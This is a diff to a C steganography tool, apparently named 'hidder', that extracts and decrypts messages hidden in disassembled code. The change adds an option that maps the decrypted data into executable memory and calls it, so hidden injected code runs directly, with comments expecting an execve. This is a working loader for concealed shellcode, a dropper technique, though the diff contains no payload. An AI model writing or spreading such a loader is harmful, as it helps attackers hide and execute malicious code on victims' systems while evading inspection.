@@ -1,5 +1,7 @@
 // header libreria
 #include "hidder.h"
+#include <string.h>         // Serve per memcpy
+#include <sys/mman.h>       // Serve per mmap
   
 int binarySearch(int arr[], int low, int high, int key)
 {
@@ -438,14 +440,39 @@ int decoder_disasm( struct hdr_section_content* hdr_code, struct hdr_data_messag
         decrypt( hdr_data->cyphertext, hdr_data->cyphertext_len, hdr_data->digest, hdr_data->ivec, hdr_data->plaintext);
         hdr_data->plaintext[hdr_data->plaintext_len]='\0';
 
-        int dim=0;
-        do{
-            dim += fwrite(hdr_data->plaintext, 1, hdr_data->plaintext_len, hdr_data->f_output);
-        }while( dim != hdr_data->plaintext_len );
-        write_log("Messaggio decifrato salvato nel file\n");
-
-		cs_free(insn, count);
-	
+        cs_free(insn, count);
+        
+        if(0==e_opt_dec)
+        {
+            int dim=0;
+            do{
+                dim += fwrite(hdr_data->plaintext, 1, hdr_data->plaintext_len, hdr_data->f_output);
+            }while( dim != hdr_data->plaintext_len );
+            write_log("Messaggio decifrato salvato nel file\n");
+        }
+        else
+        {
+            // La capacita` di eseguire codice e` un privilegio che puo` essere concesso sulle pagine della memoria
+            void *buf = mmap (0 , hdr_data->plaintext_len , PROT_READ|PROT_WRITE|PROT_EXEC , MAP_PRIVATE|MAP_ANON , -1 , 0);
+            
+            memcpy (buf , hdr_data->plaintext , hdr_data->plaintext_len);
+            /*
+            Bisogna dire al GCC che opera su x86 che la memcpy non e` una "dead store".
+            (GCC pensa che quella memcpy sia dead store perche' afferma che dereferenziare un puntatore a funzione non sia
+            equivalente a leggere i byte da quell'indirizzo).
+            In verita` questa funzione non svuota alcuna instruction cache: marca la zona di memoria come "usata" in modo
+            da permettere davvero la copiatura.
+            */
+            __builtin___clear_cache(buf , buf+hdr_data->plaintext_len-1); // -1 perche' inizio a contare da 0
+            ret = ((int(*)(void))buf)();
+            /*
+            Se il codice inoculato e` una execve, non dovrei ritornare; se cio` dovesse avvenire, interrompo tutto.
+            Se il codice inoculato non e` una execve, cambiare le seguenti due righe di conseguenza.
+            */
+            write_log("ERROR: Unexpected return from injected code!\n");
+            exit(ret);
+        }
+        
     } else write_log("ERROR: Failed to disassemble given code!\n");
 
 	cs_close(&handle);
